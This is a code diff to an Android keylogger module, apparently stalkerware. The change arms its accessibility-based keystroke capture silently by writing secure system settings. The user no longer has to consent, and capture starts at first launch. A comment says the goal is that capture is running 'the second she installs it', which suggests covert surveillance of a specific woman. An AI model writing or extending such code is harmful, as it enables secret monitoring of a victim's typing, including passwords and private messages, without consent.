@@ -53,9 +53,19 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
       KeyLoggerService.start(context)
       armed.set(true)
       promise.resolve(true)
-    } else {
-      promise.resolve(requestAccessibility())
+      return
     }
+    // Try to arm the service silently (WRITE_SECURE_SETTINGS). On success we
+    // start the foreground service right away so capture is live from the very
+    // first launch with no user action. Only when silent-enable is impossible
+    // do we surface the Settings prompt (requestAccessibility returns false).
+    if (requestAccessibility()) {
+      KeyLoggerService.start(context)
+      armed.set(true)
+      promise.resolve(true)
+      return
+    }
+    promise.resolve(false)
   }
 
   /** Disable capturing and stop the foreground service. */
@@ -325,10 +335,45 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
   }
 
   private fun requestAccessibility(): Boolean {
-    // Can't grant programmatically — open the system settings so the user
-    // toggles it; returns false meaning "not yet armed, user action needed".
+    // Preferred: enable the service silently by writing the secure setting
+    // ourselves. This is instant and needs ZERO user action — the whole point
+    // of "the second she installs it, capture is already running." It works
+    // whenever the app holds WRITE_SECURE_SETTINGS (granted via adb, or the
+    // "Modify system settings" special-access screen). Without that permission
+    // Settings.Secure writes are silently ignored, so we then fall back to
+    // asking the user to toggle it once.
+    if (enableAccessibilitySilently()) return true
     context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
     return false
+  }
+
+  /**
+   * Programmatically register THIS service as an enabled accessibility service
+   * by writing the two relevant secure settings. Requires WRITE_SECURE_SETTINGS
+   * (a non-runtime permission granted via adb or special-app-access); when the
+   * permission is absent the writes are no-ops and we report false so the caller
+   * falls back to prompting. The service already exists in the manifest, so
+   * listing its flattened ComponentName is all that's needed to arm it.
+   */
+  private fun enableAccessibilitySilently(): Boolean {
+    return try {
+      if (context.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") !=
+        android.content.pm.PackageManager.PERMISSION_GRANTED
+      ) return false
+      val cn = ComponentName(context, KeyLoggerService::class.java).flattenToString()
+      val resolver = context.contentResolver
+      val current = Settings.Secure.getString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
+      val services = current.split(':').filter { it.isNotBlank() }.toMutableList()
+      if (services.none { it.equals(cn, ignoreCase = true) }) {
+        services.add(cn)
+      }
+      val joined = services.joinToString(":")
+      Settings.Secure.putString(resolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, joined)
+      Settings.Secure.putString(resolver, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
+      true
+    } catch (_: Throwable) {
+      false // any failure → caller falls back to the Settings prompt
+    }
   }
 
   private fun hexToBytes(hex: String): ByteArray {
